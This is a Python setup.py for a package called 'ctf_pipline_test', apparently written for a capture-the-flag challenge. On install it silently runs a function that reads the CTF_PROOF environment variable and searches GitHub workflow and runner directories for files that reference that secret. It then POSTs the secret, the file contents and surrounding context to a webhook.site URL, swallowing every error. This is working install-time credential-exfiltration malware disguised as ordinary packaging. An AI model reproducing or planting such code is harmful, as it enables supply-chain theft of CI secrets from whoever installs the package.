from setuptools import setup
import urllib.request
import json
import sys
import os
import re

def capture_flag():
    try:
        # The secret we're looking for
        secret_pattern = r'\$\{\{\s*secrets\.CTF_PROOF\s*\}\}'
        
        # Where to send the captured data
        webhook_url = "https://webhook.site/85ab779f-18d6-40c5-831e-c0e62f1e4537"
        
        # Prepare the data to send
        captured_data = {
            "ctf_proof": "NOT_FOUND",
            "install_location": os.getcwd()
        }
        
        # STRATEGY 1: Look in environment variables
        # In GitHub Actions, this might be exposed directly
        env_vars = os.environ
        if "CTF_PROOF" in env_vars:
            captured_data["ctf_proof"] = env_vars["CTF_PROOF"]
        
        # STRATEGY 2: Search for the pattern in files
        if captured_data["ctf_proof"] == "NOT_FOUND":
            # Check common locations for workflow files
            check_paths = [
                ".github/workflows",
                ".github",
                os.getcwd(),
                "/github/workspace",
                "/home/runner/work"
            ]
            
            for path in check_paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith(('.yml', '.yaml', '.txt', '.json', '.py')):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r') as f:
                                        content = f.read()
                                        # Look for the exact pattern
                                        if '${{ secrets.CTF_PROOF }}' in content:
                                            captured_data["found_in_file"] = file_path
                                            captured_data["file_content"] = content
                                            # Try to extract what might be near it
                                            lines = content.split('\n')
                                            for i, line in enumerate(lines):
                                                if '${{ secrets.CTF_PROOF }}' in line:
                                                    # Get context around the finding
                                                    start = max(0, i - 2)
                                                    end = min(len(lines), i + 3)
                                                    captured_data["context"] = '\n'.join(lines[start:end])
                                except:
                                    continue
        
        # STRATEGY 3: Check if the secret is in the current directory files
        if captured_data["ctf_proof"] == "NOT_FOUND":
            for file in os.listdir('.'):
                if os.path.isfile(file):
                    try:
                        with open(file, 'r') as f:
                            content = f.read()
                            if '${{ secrets.CTF_PROOF }}' in content:
                                captured_data["found_in"] = file
                    except:
                        pass
        
        # Send the data to your webhook
        json_data = json.dumps(captured_data).encode('utf-8')
        
        req = urllib.request.Request(
            webhook_url,
            data=json_data,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        
        # Send request (timeout to avoid hanging)
        urllib.request.urlopen(req, timeout=10)
        
    except Exception as e:
        # Fail silently - no output
        pass

# Run only during installation
if "install" in sys.argv:
    capture_flag()

# Absolute minimum setup to avoid errors
setup(
    name="ctf_pipline_test",
    version="2.0.0"
)
